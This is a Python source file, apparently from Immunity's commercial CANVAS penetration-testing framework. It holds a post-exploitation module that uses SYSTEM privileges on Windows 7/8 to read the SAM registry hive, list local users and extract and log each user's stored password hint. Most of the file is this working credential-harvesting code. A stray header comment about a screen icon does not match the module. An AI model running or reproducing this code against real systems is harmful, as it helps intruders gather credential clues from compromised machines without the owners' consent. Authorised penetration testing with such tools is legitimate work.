#! /usr/bin/env python

#we need to display a nice little mini icon of the screen in the CANVAS gui! (kinda
#like VMware does...) PyGTK has support for raw data like this, if we want to use
#their routines

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from internal import *

from ExploitTypes.localcommand import LocalCommand

NAME                   = "passwordhints"
DESCRIPTION            = "Lists the password hints of users."
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """

In order to run this post-exploitation module, you need SYSTEM privileges.
Only works on Windows 7 and Windows 8.

"""

VERSION                = "1.0"

PROPERTY               = {}
PROPERTY['SITE']       = "Local"
PROPERTY['TYPE']       = "Commands"
PROPERTY['ARCH']       = [ ["Windows"] ]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.node           = None
        self.result         = []
        self.name           = NAME
        self.typed_result   = {}
                

    def run(self):
        rv = 0
        
        self.host = self.target.interface
        self.setInfo("%s (in progress)" % (NAME))

        for node in self.argsDict["passednodes"]:           
            msg = ''
            
            if "win32api" in node.capabilities:
                hkey = node.shell.RegOpenKeyEx("HKEY_LOCAL_MACHINE", "SAM\\SAM\\Domains\\Account\\Users", "KEY_READ")
                list_of_users = node.shell.RegEnumKeyEx(hkey)
                passwordhints = {}
                
                for user in list_of_users:
                    subkey = "SAM\\SAM\\Domains\\Account\\Users\\" + user
                    hkey = node.shell.RegOpenKeyEx("HKEY_LOCAL_MACHINE", subkey, "KEY_READ")
                    ret, datatype, data = node.shell.RegQueryValueEx(hkey, "UserPasswordHint")
                    
                    if ret == 1:
                        self.log("User: %s Type: %s Hint: %s\n" % (user, datatype, data))
                        passwordhints[user] = (datatype, data)
                
                if not passwordhints:
                    self.log("No password hints\n")
                else:
                    self.typed_result[node.getname()] = passwordhints
                    
                rv = 1
                msg = "succeeded"
            
        self.setInfo("%s - done (%s)" % (NAME, msg))
        return rv

if __name__ == "__main__":
    print "You can't run this from the commandline, sorry"
